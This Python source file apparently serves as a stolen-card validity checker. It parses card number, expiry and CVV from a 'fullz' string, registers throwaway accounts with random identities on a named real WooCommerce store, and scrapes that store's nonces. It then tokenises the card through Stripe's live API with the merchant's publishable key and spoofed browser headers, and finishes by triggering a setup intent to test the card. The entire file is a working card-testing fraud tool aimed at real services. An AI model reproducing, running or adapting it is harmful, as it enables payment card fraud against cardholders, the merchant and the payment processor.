import asyncio
import base64
import random
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup
from FUNC.defs import *

# import requests


def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None




async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        user_agent          = UserAgent().random
        random_data         = await get_random_info(session)
        fname               = random_data["fname"]
        lname               = random_data["lname"]
        email               = random_data["email"]



        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'dnt': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-gpc': '1',
        }

        response = await session.get('https://mooretruckparts.com.au/my-account/', headers=headers)


        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" /><')


        print(nonce)


        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://mooretruckparts.com.au',
            'Referer': 'https://mooretruckparts.com.au/my-account/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'dnt': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-gpc': '1',
        }

        data = {
            'email': email,
            'password': 'fdhfghfgjdfjgfdg',
            'mailchimp_woocommerce_newsletter': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://mooretruckparts.com.au/',
            'wc_order_attribution_session_start_time': '2025-03-07 08:56:08',
            'wc_order_attribution_session_pages': '7',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        response = await session.post('https://mooretruckparts.com.au/my-account/', headers=headers, data=data)


        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://mooretruckparts.com.au/my-account/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'dnt': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-gpc': '1',
        }

        response = await session.get('https://mooretruckparts.com.au/my-account/', headers=headers)


        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://mooretruckparts.com.au/my-account/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'dnt': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-gpc': '1',
        }

        response = await session.get('https://mooretruckparts.com.au/my-account/payment-methods/', headers=headers)



        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://mooretruckparts.com.au/my-account/payment-methods/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'dnt': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-gpc': '1',
        }

        response = await session.get('https://mooretruckparts.com.au/my-account/add-payment-method/', headers=headers)



        payment_nonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')

        print(payment_nonce)


        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }

        data={
        'type':'card',
        'card[number]':cc,
        'card[cvc]':cvv,
        'card[exp_year]':ano,
        'card[exp_month]':mes,
        'allow_redisplay':'unspecified',
        'billing_details[address][country]':'IN',
        'pasted_fields':'number',
        'payment_user_agent':'stripe.js/14fdc586f6; stripe-js-v3/14fdc586f6; payment-element; deferred-intent',
        'referrer':'https://mooretruckparts.com.au',
        'time_on_page':'49881',
        'client_attribution_metadata[client_session_id]':'b1962a5c-4101-4fec-9e39-5bbd18cee31c',
        'client_attribution_metadata[merchant_integration_source]':'elements',
        'client_attribution_metadata[merchant_integration_subtype]':'payment-element',
        'client_attribution_metadata[merchant_integration_version]':'2021',
        'client_attribution_metadata[payment_intent_creation_flow]':'deferred',
        'client_attribution_metadata[payment_method_selection_flow]':'merchant_specified',
        'guid':'fd286b17-3ad6-4186-8cd6-e30c9fb40054b2fc13',
        'muid':'43bdf9ce-901e-4c4e-b27e-9de5fe4313754733c6',
        'sid':'186a5cd7-ffd0-4828-ac22-37f9066d2344e024b8',
        'key':'pk_live_51E8DVkChndEVEIPgg7ic3Q5wLpPCATsMKEMUITiJumFq7tgpF2dL8ZoPI5dDHtjSKZNCcyG5uileis8GPoy6DhZr00BymjyeIo',
        '_stripe_version':'2024-06-20',
        }
        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)



        try:
             id=response.json()['id']
             print(id)
        except:
             return response.text


        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://mooretruckparts.com.au',
            'Referer': 'https://mooretruckparts.com.au/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'dnt': '1',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-gpc': '1',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }

        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': payment_nonce,
        }

        response = await session.post('https://mooretruckparts.com.au/', params=params, headers=headers, data=data)

        print(response.text)

        return response.text




    except Exception as e:
        return str(e)
